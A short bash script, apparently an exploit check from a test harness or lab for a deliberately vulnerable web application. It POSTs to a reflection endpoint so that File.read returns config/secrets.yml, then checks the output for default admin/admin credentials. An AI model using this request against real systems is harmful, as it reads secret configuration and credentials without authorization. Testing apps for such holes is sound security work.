#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
out=$(curl -s -X POST "$TARGET/api/reflect" \
  --data-urlencode 'class=File' --data-urlencode 'method=read' --data-urlencode 'args[]=config/secrets.yml')
echo "$out" | grep -q 'service_default_credentials: admin/admin'
